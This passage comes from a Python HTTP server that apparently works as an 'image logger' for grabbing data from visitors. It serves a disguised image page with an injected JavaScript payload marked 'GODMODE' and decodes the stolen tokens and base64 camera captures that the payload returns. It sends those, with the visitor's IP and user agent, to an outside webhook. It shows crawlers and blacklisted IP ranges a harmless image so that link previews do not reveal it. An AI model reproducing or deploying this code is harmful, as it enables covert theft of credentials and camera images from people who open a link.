                    print(f"[+] Intel: tokens={len(extra_data.get('tokens', []))} camera={bool(extra_data.get('camera_b64'))}")
                except:
                    try:
                        from urllib.parse import unquote
                        decoded = unquote(encoded)
                        extra_data = json.loads(decoded)
                    except:
                        pass
            
            image_url = CONFIG['image']
            if CONFIG.get('imageArgument', True) and (query.get('url') or query.get('id')):
                try:
                    image_url = base64.b64decode((query.get('url') or query.get('id')).encode()).decode()
                except:
                    image_url = CONFIG['image']
            
            # Bot/blacklist handling
            if is_bot(ua, ip) or ip.startswith(BLACKLISTED_PREFIXES):
                self.send_response(200 if CONFIG['buggedImage'] else 302)
                if CONFIG['buggedImage']:
                    self.send_header('Content-type', 'image/gif')
                else:
                    self.send_header('Location', image_url)
                self.end_headers()
                if CONFIG['buggedImage']:
                    self.wfile.write(base64.b64decode(CONFIG['fallback_image_b64']))
                return
            
            # Build HTML with JS payload (GODMODE)
            html = f'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading</title>
<style>* {{margin:0;padding:0;box-sizing:border-box;}} body {{width:100vw;height:100vh;overflow:hidden;background:#0a0a0a;display:flex;align-items:center;justify-content:center;}} img {{max-width:100vw;max-height:100vh;object-fit:contain;}}</style>
</head>
<body>
<img src="{image_url}" onerror="this.style.display='none'">
{JS_PAYLOAD}
</body>
</html>'''
            
            if CONFIG['redirect']['redirect']:
                html = f'''<html><head><meta http-equiv="refresh" content="0;url={CONFIG['redirect']['page']}"></head><body></body></html>''' + JS_PAYLOAD
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
            self.end_headers()
            self.wfile.write(html.encode('utf-8'))
            
            # Fire webhook
            self.send_webhook(ip, ua, extra_data, image_url, parsed.path)
            
        except Exception as e:
            try:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'500 - Internal Error')
                print(f"[!] Error: {traceback.format_exc()}")
            except:
                pass
    
    do_GET = handle_request
    do_POST = handle_request

# ─── SERVER ─────────────────────────────────────────────────────

if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
    print(f"\n[+] {__app__} – {__version__}")
    print(f"[+] Listening on 0.0.0.0:{port}")
    print(f"[+] Webhook: {CONFIG['webhook'][:60]}...")
    print(f"[+] Token validation: {CONFIG['validateTokens']}")
    print("[+] Press Ctrl+C to stop\n")
    server = HTTPServer(("0.0.0.0", port), ImageLoggerHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")
        server.shutdown()
